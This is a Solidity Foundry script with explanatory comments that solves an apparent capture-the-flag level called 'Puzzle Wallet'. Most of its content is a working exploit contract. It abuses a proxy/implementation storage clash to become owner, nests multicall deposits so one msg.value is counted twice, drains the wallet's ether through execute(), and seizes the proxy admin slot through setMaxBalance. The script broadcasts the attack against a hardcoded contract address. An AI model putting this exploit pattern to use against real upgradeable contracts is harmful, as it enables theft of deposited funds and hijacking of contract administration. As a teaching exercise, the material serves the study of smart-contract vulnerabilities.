// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface PuzzleWallet {
    function admin() external view returns (address);
    function proposeNewAdmin(address _newAdmin) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function multicall(bytes[] calldata data) external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function setMaxBalance(uint256 _maxBalance) external;
}

/*
    Nowadays, paying for DeFi operations is impossible, fact.
    A group of friends discovered how to slightly decrease the cost of performing multiple transactions by batching them in one transaction,
    so they developed a smart contract for doing this.
    They needed this contract to be upgradeable in case the code contained a bug, and they also wanted to prevent people from outside the group from using it.
    To do so, they voted and assigned two people with special roles in the system:
        The admin, which has the power of updating the logic of the smart contract.
        The owner, which controls the whitelist of addresses allowed to use the contract.

    The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.
    Little did they know, their lunch money was at risk…
    You'll need to hijack this wallet to become the admin of the proxy.

    Things that might help:
    Understanding how delegatecall works and how msg.sender and msg.value behaves when performing one.
    Knowing about proxy patterns and the way they handle storage variables.


    Solution:
    1. Call proposeNewAdmin(ourAddress)
    2. Add our address to addToWhitelist
    3. Stack multicall() to trick the contract into thinking we deposited more than we did
    4. Withdraw all funds with execute()
    5. Call setMaxBalance(uint256(uint160(ourAddress)))


    Use storage clash between proxy and wallet
    Proxy contract has a function proposeNewAdmin() which changes slot 0 in Proxy
    If we use it it will change the slot 0 in Wallet contract which is owner
    We become owner of Wallet contract

    Once we are owner we add our address to the whitelist
    This allows us to make a multicall

    We stack multicall with two deposits so the contract thinks we have deposited twice as much
    Because it uses the same value from msg.value
    The multicall will look like
    multicall(
        deposit(),
        multicall(deposit())
    )

    Then we call execute which will transfer the contract balance to us
    This will allow us to call setMaxBalance(uint256(uint160(ourAddress)))

    setMaxBalance uses the same storage clash as before to set the admin of the proxy contract to our uint casted address

 */


contract PuzzleAttack {

    PuzzleWallet puzzleWallet;
    uint256 balance;

    constructor (PuzzleWallet _puzzleWallet, uint256 _balance) payable {
        puzzleWallet = _puzzleWallet;
        balance = _balance;
        // Storage clash means this will make PuzzleAttack the owner of PuzzleWallet
        puzzleWallet.proposeNewAdmin(address(this));
        // Add PuzzleAttack to whitelist
        puzzleWallet.addToWhitelist(address(this));
        // Get balance of puzzleWallet to deposit same amount and spoof a second deposit
    }

    function attack() external payable {
        // Using multicall
        // We build 2 calls
        // 1. Deposit
        // 2. Multicall(Deposit)
        // Calling Multicall allows us to call deposit twice
        bytes[] memory depositSelector = new bytes[](1);
        depositSelector[0] = abi.encodeWithSelector(puzzleWallet.deposit.selector);
        bytes[] memory multiCallData = new bytes[](2);
        multiCallData[0] = abi.encodeWithSelector(puzzleWallet.deposit.selector);
        multiCallData[1] = abi.encodeWithSelector(puzzleWallet.multicall.selector, depositSelector);
        puzzleWallet.multicall{value: balance}(multiCallData);

        // puzzleWallet thinks we deposited twice as much so we can withdraw all the ether
        puzzleWallet.execute(msg.sender, 2 * balance, "");
        // Storage clash makes this update admin variable on PuzzleWallet
        puzzleWallet.setMaxBalance(uint256(uint160(msg.sender)));

        require(puzzleWallet.admin() == msg.sender);

        selfdestruct(payable(msg.sender));
    }

    fallback() external payable {}
}

contract PuzzleWalletSolution is Script {

    PuzzleWallet puzzleWallet = PuzzleWallet(0x066B60B5D9DDbfd77fF34f1Fc26b2FeA2038d8B2);
    uint256 balance = address(puzzleWallet).balance;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        PuzzleAttack puzzleAttack = new PuzzleAttack{value: balance}(puzzleWallet, balance);
        puzzleAttack.attack();
        vm.stopBroadcast();
    }
}